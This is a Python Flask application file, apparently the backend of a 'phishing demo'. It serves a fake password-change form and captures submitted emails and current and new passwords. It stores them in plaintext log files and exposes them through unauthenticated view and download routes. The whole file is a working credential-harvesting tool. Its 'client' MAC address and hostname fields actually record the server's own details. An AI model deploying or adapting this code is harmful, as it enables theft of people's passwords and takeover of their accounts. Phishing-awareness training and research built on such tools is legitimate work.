# app/app.py
import os, json, datetime, socket, uuid, platform, re, csv, sys
from flask import Flask, render_template, request, redirect, send_file, jsonify, Response

# then figure out paths
base_dir    = os.path.dirname(os.path.abspath(__file__))
assets_dir  = os.path.join(base_dir, 'assets')

# then data directory (project-local ./data)
DATA_DIR      = os.environ.get('DATA_DIR', os.path.join(base_dir, 'data'))
LOG_FILE_JSON = os.path.join(DATA_DIR, 'submissions.json')
LOG_FILE_CSV  = os.path.join(DATA_DIR, 'submissions.csv')
LOG_FILE_TXT  = os.path.join(DATA_DIR, 'submissions.txt')

# then create Flask app
app = Flask(
    __name__,
    static_folder=assets_dir,
    static_url_path='/assets'
)
app.secret_key = 'gu_phishing_demo_secret_key'

# then helper: ensure logs folder + files exist
def initialize_log_files():
    os.makedirs(DATA_DIR, exist_ok=True)                        # then make folder
    if not os.path.exists(LOG_FILE_CSV):                        # then CSV
        with open(LOG_FILE_CSV, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([
                'timestamp','email','current_password','new_password',
                'confirm_password','ip_address','mac_address',
                'hostname','user_agent'
            ])
    if not os.path.exists(LOG_FILE_JSON):                       # then JSON
        open(LOG_FILE_JSON, 'w').close()
    if not os.path.exists(LOG_FILE_TXT):                        # then TXT
        with open(LOG_FILE_TXT, 'w') as f:
            f.write("=== Phishing Demo Submissions ===\n\n" + "-"*80 + "\n\n")

# then call once on startup
initialize_log_files()

# then utility for console logs
def log_to_console(msg):
    print(msg, flush=True)

# then helpers to collect client info
def get_mac_address():
    try:
        mac = ':'.join(re.findall('..','%012x'%uuid.getnode()))
        return mac
    except:
        return "Unknown MAC"

def get_system_info():
    try:
        return {
            "platform": platform.platform(),
            "system": platform.system(),
            "release": platform.release(),
            "machine": platform.machine(),
            "processor": platform.processor()
        }
    except:
        return {"platform": "Unknown"}

def format_readable_log(data):
    info = "\n".join(f"  {k}: {v}" for k,v in data['system_info'].items())
    return f"""
=== Submission at {data['timestamp']} ===
Email: {data['email']}
Current: {data['current_password']}
New:     {data['new_password']}
Confirm: {data['confirm_password']}
IP:      {data['ip_address']}
MAC:     {data['mac_address']}
Host:    {data['hostname']}
Agent:   {data['user_agent']}

System Info:
{info}
"""

# then routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    # then grab form
    email    = request.form['email']
    current  = request.form['currentPassword']
    new      = request.form['newPassword']
    confirm  = request.form['confirmPassword']

    # then client info
    ip       = request.headers.get('X-Forwarded-For', request.remote_addr)
    mac      = get_mac_address()
    host     = socket.gethostname()
    agent    = request.headers.get('User-Agent')
    sysInfo  = get_system_info()
    ts       = datetime.datetime.utcnow().isoformat()

    # then assemble
    data = {
        "timestamp":      ts,
        "email":          email,
        "current_password": current,
        "new_password":     new,
        "confirm_password": confirm,
        "ip_address":       ip,
        "mac_address":      mac,
        "hostname":         host,
        "user_agent":       agent,
        "system_info":      sysInfo
    }

    # then log to console
    log_to_console(f"PHISHING SUBMISSION:\n{json.dumps(data,indent=2)}")

    # then append to files
    with open(LOG_FILE_JSON, 'a') as f:
        f.write(json.dumps(data, default=str) + "\n")
    with open(LOG_FILE_CSV, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([
            ts, email, current, new, confirm, ip, mac, host, agent
        ])
    with open(LOG_FILE_TXT, 'a') as f:
        f.write(format_readable_log(data) + "\n" + "-"*80 + "\n\n")

    return redirect('/success')

@app.route('/success')
def success():
    return render_template('success.html')

@app.route('/view-logs')
def view_logs():
    # then read text log
    with open(LOG_FILE_TXT) as f:
        content = f.read()
    count = content.count("=== Submission at")
    return render_template('logs.html',
                           logs=content,
                           total=count)

@app.route('/data/<kind>')
def download(kind):
    # then serve raw files
    mapping = {
        'json': LOG_FILE_JSON,
        'csv':  LOG_FILE_CSV,
        'txt':  LOG_FILE_TXT
    }
    path = mapping.get(kind)
    if not path:
        return jsonify(error="Use json, csv or txt"), 400
    return send_file(path,
                     as_attachment=True,
                     download_name=f"submissions.{kind}")

# then run
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv('PORT',5000)), debug=bool(os.getenv('DEBUG')))
